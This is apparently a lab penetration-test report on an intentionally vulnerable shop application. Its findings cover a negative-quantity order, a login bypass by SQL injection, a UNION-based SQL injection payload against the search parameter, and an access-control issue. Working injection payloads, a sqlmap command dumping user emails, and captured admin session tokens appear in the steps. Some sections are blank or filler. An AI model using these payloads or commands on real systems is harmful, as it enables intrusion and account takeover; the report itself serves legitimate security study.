# 35. Inproper Input validation on quantity parameter on [192.168.1.10:3000]

## Description

The issue exists in the product order form where the quantity field does not have input validation to prevent negative values from being submitted. An attacker can exploit this vulnerability by manipulating the quantity field in the product order form and submitting the order with a negative value.

## 6.1 (Medium)

## Impact 

By allowing negative quantities to be ordered, it could create a discrepancy between the actual inventory and the recorded inventory. Additionally, it could also affect revenue tracking as negative orders could cause a financial loss for your company.

## Remidiation

I recommend that you implement input validation to ensure that only positive integers are allowed in the quantity field. Furthermore, it would be helpful to add server-side validation to prevent the submission of negative values.

## Step to reproduce

1. Navigate url using browser : http://192.168.1.10:3000/#/login
2. Login with your credential.
3. Add any producet to baskets.
4. Intercept the request using burp-suite.
5. Find the request look like below.

```
POST /api/BasketItems/ HTTP/1.1
Host: 192.168.1.10:3000
Content-Length: 47
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDMtMDggMDI6MzQ6NDYuNDI2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDMtMDggMDI6MzQ6NDYuNDI2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3ODI0MzUzNCwiZXhwIjoxNjc4MjYxNTM0fQ.sb8-LLwFH_DxrQEPNv0L-aXratZ-eHrbRpVf5M-HFMeIl6-wTWeTg6JyUUPxDSA6JPmqP-XW5QH3vQcktv0eSQVO2XDgEYpU3-PBW9GPlwROb8Q9hXSWgVOoEAx8kMM6jwfMqTD0PlYZhshoYQbHD8-LYZUEtdpIZQ5nu3Zvm-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://192.168.1.10:3000
Referer: http://192.168.1.10:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=O6HkhWt2IvsWS6UlH4hETeFZf8SDiaPtjqiRafvYHZLtWkcOjCkeSY9UB4TNvC81UZaSQOHOWhN9t22FK8TrwsPX; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDMtMDggMDI6MzQ6NDYuNDI2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDMtMDggMDI6MzQ6NDYuNDI2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3ODI0MzUzNCwiZXhwIjoxNjc4MjYxNTM0fQ.sb8-LLwFH_DxrQEPNv0L-aXratZ-eHrbRpVf5M-HFMeIl6-wTWeTg6JyUUPxDSA6JPmqP-XW5QH3vQcktv0eSQVO2XDgEYpU3-PBW9GPlwROb8Q9hXSWgVOoEAx8kMM6jwfMqTD0PlYZhshoYQbHD8-LYZUEtdpIZQ5nu3Zvm-8
Connection: close

{"ProductId":42,"BasketId":"1","quantity":1}
```
6. Change the value of quantity parameter : 1 to -1000

> <img width="1552" alt="Screenshot 2023-03-08 at 8 18 48 AM" src="https://user-images.githubusercontent.com/113350146/223608981-12df042d-f03f-4ce6-8b5c-6485fbf0b8a8.png">

7. Forword this request.
8. Complete the all proccess of buy product.
9. Observe the response.

## Proof of concept

<img width="1552" alt="Screenshot 2023-03-08 at 8 19 28 AM" src="https://user-images.githubusercontent.com/113350146/223609029-38873b84-094d-4009-acaa-881cf4c09656.png">

---

# 36. Broken Authentication via sql injection on [192.168.1.10:3000]

## Description

The issue exists in the login form where user input is not properly sanitized before being passed to the database query. An attacker can exploit this vulnerability by injecting malicious SQL code into the login form to bypass authentication and gain access to account. 

## 9.8 (Critical)

## Afected url 
http://192.168.1.10:3000/#/login

## Impact 

Attacker can get the any acccount information and takeover any account using this vulnerability.

## Remidiation

To remediate this vulnerability, I recommend that you implement input validation and parameterized queries to prevent SQL injection attacks. Additionally, you should enforce strong password policies and use multi-factor authentication to strengthen your authentication controls. You should also consider implementing a web application firewall (WAF) to detect and block malicious requests.

## Step to reproduce

1. Navigate url using browser : http://192.168.1.10:3000/#/login
2. Login with below credential.

I will get the all email using sqlmap below command.
sqlmap --random-agent --level 5 -u "http://192.168.1.10:3000/rest/products/search?q=" -D SQLite -T Users -C email --dump

<img width="1550" alt="Screenshot 2023-03-08 at 8 42 33 AM" src="https://user-images.githubusercontent.com/113350146/223611557-ee82e375-d904-4994-a7c5-943b984cea4a.png">

Email - chris.pike@juice-sh.op

login using sql injection method without password so password is any you want to enter.

Email - chris.pike@juice-sh.op'--
Password - randomPassword

## Proof of concept

https://user-images.githubusercontent.com/113350146/223611582-1781514e-afcd-4033-9473-d7d2cac3b826.mov

---

37. Sql injection on search "q" parameter

## Description

sql injection

## 9.8 (Critical)

## Afected url 
http://192.168.1.10:3000/rest/products/search?q=xxx

## Impact 

sql injection

## Remidiation

sql injection

## Step to reproduce

1. Navigate url using browser : http://192.168.1.10:3000/#/login
2. Login with below credential.
3. Search any producet.
4. Intercept the request using burp-suite.
5. Find the request look like below.

```
GET /rest/products/search?q=apple HTTP/1.1
Host: 192.168.1.10:3000
Accept: application/json, text/plain, */*
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDMtMDggMDI6MzQ6NDYuNDI2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDMtMDggMDI6MzQ6NDYuNDI2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3ODI0MzUzNCwiZXhwIjoxNjc4MjYxNTM0fQ.sb8-LLwFH_DxrQEPNv0L-aXratZ-eHrbRpVf5M-HFMeIl6-wTWeTg6JyUUPxDSA6JPmqP-XW5QH3vQcktv0eSQVO2XDgEYpU3-PBW9GPlwROb8Q9hXSWgVOoEAx8kMM6jwfMqTD0PlYZhshoYQbHD8-LYZUEtdpIZQ5nu3Zvm-8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36
Referer: http://192.168.1.10:3000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjMtMDMtMDggMDI6MzQ6NDYuNDI2ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjMtMDMtMDggMDI6MzQ6NDYuNDI2ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY3ODI0MzUzNCwiZXhwIjoxNjc4MjYxNTM0fQ.sb8-LLwFH_DxrQEPNv0L-aXratZ-eHrbRpVf5M-HFMeIl6-wTWeTg6JyUUPxDSA6JPmqP-XW5QH3vQcktv0eSQVO2XDgEYpU3-PBW9GPlwROb8Q9hXSWgVOoEAx8kMM6jwfMqTD0PlYZhshoYQbHD8-LYZUEtdpIZQ5nu3Zvm-8; continueCode=58H5hlt6ILsRSjUqH8h4TeFrfOSOivotg9i4lf1bSz8HNMtWlcLDCN5SZLUXOTvxCgviqjSlpHJjh4oIooI1ZFRgs81
If-None-Match: W/"325f-aBBi/YGeQaayDET1XiisOjsN/R8"
Connection: close
```

6. Add the below payload after the product name.

'))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--

7. Send the request and observe the response.

## Proof of concept

<img width="1552" alt="Screenshot 2023-03-08 at 9 03 53 AM" src="https://user-images.githubusercontent.com/113350146/223613257-7adba053-7637-4967-bb50-cafd4dd1a153.png">

---

38. Broken Access Control : update product via put method

<img width="1508" alt="Screenshot 2023-03-08 at 9 21 20 AM" src="https://user-images.githubusercontent.com/113350146/223616875-21fa127e-f936-4975-8ca5-9c4dc4eab735.png">

---

39. 
